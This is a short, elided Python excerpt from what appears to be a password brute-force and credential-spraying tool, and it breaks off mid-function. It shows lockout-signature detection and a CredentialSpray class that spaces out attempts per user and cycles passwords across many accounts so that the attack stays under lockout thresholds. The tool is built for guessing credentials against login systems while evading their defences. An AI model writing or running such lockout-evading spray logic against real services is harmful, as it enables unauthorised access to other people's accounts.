...
class BruteEngine:
    ...
    def _check_lockout(self, user, response):
        ...
        if any(s in rl for s in LOCKOUT_SIGS):
            ...
            if self.checkpoint:
                self.checkpoint.mark_locked(user)
            return True
...
class CredentialSpray:
    def __init__(self, window=1800, max_per_window=1):
        self.window = window
        self.max_pw = max_per_window
        self._log = {}

    def can_spray(self, user):
        now = time.time()
        recent = [t for t in self._log.get(user, []) if now - t < self.window]
        self._log[user] = recent
        return len(recent) < self.max_pw

    def record(self, user):
        self._log.setdefault(user, []).append(time.time())

    async def pairs(self, users, passwords, inter_delay=0.0):
        for passwd in passwords:
            for user in users:
                if self.can_spray(user):
                    self.record(user)
                    yield user, passwd
            if inter_delay > 0:
